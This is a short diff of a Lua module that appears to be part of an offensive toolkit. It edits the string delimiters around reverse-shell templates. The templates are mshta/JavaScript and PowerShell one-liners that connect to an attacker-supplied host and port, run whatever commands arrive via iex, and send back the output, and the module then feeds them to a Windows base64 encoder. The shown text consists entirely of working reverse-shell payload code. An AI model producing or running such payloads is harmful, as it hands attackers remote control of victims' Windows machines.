@@ -18,9 +18,9 @@ mshta javascript:a=new%%20ActiveXObject("Socket");a.open("tcp","%s",%s);while(a.
 ]], lhost, lport, lhost)
 
     -- One-liner más realista
-    local oneliner = string.format([[
+    local oneliner = string.format([==[
 mshta javascript:var s=new ActiveXObject("WScript.Shell");s.Run("powershell -nop -c $c=New-Object Net.Sockets.TCPClient('%s',%s);$s=$c.GetStream();[byte[]]$b=0..65535;while(($i=$s.Read($b,0,$b.Length))){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$e=iex $d 2>&1;$s.Write($e,0,$e.Length);};");close()
-]], lhost, lport)
+]==], lhost, lport)
 
     app.one_cmd("encodewinbase64 " .. oneliner)
 
